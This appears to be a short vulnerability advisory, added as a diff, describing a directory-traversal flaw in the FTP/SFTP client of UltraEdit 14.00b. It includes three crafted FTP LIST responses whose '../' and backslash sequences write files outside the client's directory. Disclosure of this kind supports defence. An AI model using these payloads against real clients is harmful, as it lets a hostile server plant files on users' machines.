@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/29784/info
+
+UltraEdit is prone to a directory-traversal vulnerability because the application fails to sufficiently sanitize user-supplied input. This issue occurs in the FTP/SFTP client.
+
+Exploiting this issue will allow an attacker to write arbitrary files to locations outside of the application's current directory. This could help the attacker launch further attacks.
+
+UltraEdit 14.00b is vulnerable; other versions may also be affected. 
+
+Response to LIST (backslash):
+
+\..\..\..\..\..\..\..\..\..\testfile.txt\r\n
+
+Response to LIST (forward-slash):
+/../../../../../../../../../testfile.txt\r\n
+
+Response to LIST (backslash and forward-slash):
+../..\/..\/..\/../..\/../..\/../testfile.txt\r\n 
